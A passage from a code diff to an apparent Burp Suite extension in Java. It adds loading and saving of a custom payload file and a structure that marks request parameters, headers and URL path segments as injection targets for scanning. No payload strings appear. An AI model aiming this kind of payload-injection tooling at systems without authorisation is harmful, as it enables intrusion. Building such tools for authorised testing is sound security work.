+        Path path = Paths.get(DIY_PAYLOAD_FILE);
+        if (!Files.exists(path)) {
+            saveDiyPayloadText(DEFAULT_DIY_PAYLOAD);
+            return DEFAULT_DIY_PAYLOAD;
+        }
+
+        StringBuilder sb = new StringBuilder();
+        try (BufferedReader in = Files.newBufferedReader(path, StandardCharsets.UTF_8)) {
+            String line;
+            while ((line = in.readLine()) != null) {
+                sb.append(line).append("\n");
+            }
+        } catch (IOException e) {
+            appendLog("读取payload文件失败，使用默认payload: " + e.getMessage());
+            return DEFAULT_DIY_PAYLOAD;
+        }
+
+        String text = sb.toString().trim();
+        return text.isEmpty() ? DEFAULT_DIY_PAYLOAD : text;
+    }
+
+    private boolean saveDiyPayloadText(String content) {
+        Path path = Paths.get(DIY_PAYLOAD_FILE);
+        try (BufferedWriter out = Files.newBufferedWriter(path, StandardCharsets.UTF_8)) {
+            out.write(content == null ? "" : content);
+            return true;
+        } catch (IOException e) {
+            appendLog("写入payload文件失败: " + e.getMessage());
+            return false;
+        }
+    }
+
+    private static final class ScanTarget {
+        final boolean isHeaderTarget;
+        final boolean isPathTarget;
+        final String name;
+        final String value;
+        final HttpParameterType paramType;
+        final int pathIndex;
+
+        private ScanTarget(boolean isHeaderTarget, boolean isPathTarget, String name, String value,
+                           HttpParameterType paramType, int pathIndex) {
+            this.isHeaderTarget = isHeaderTarget;
+            this.isPathTarget = isPathTarget;
+            this.name = name;
+            this.value = value;
+            this.paramType = paramType;
+            this.pathIndex = pathIndex;
+        }
+
+        static ScanTarget parameterTarget(ParsedHttpParameter para) {
+            return new ScanTarget(false, false, para.name(), para.value(), para.type(), -1);
+        }
+
+        static ScanTarget headerTarget(String name, String value) {
+            return new ScanTarget(true, false, name, value, null, -1);
+        }
+
+        static ScanTarget pathTarget(String name, String value, int pathIndex) {
+            return new ScanTarget(false, true, name, value, null, pathIndex);
+        }
     }
 
     private HttpRequest buildJsonRequest(HttpRequest req, String fieldName, String newValue) {
@@ -1529,6 +1886,15 @@ public class BurpExtender implements BurpExtension {
         try {
             Method m = req.getClass().getMethod(methodName, String.class, String.class);
             Object ret = m.invoke(req, arg1, arg2);
+            if (ret instanceof HttpRequest) return (HttpRequest) ret;
+        } catch (Exception ignored) {}
+        return req;
+    }
+
+    private HttpRequest tryInvokeRequestMethod(HttpRequest req, String methodName, URI arg1) {
+        try {
+            Method m = req.getClass().getMethod(methodName, URI.class);
+            Object ret = m.invoke(req, arg1);
             if (ret instanceof HttpRequest) return (HttpRequest) ret;
         } catch (Exception ignored) {}
         return req;
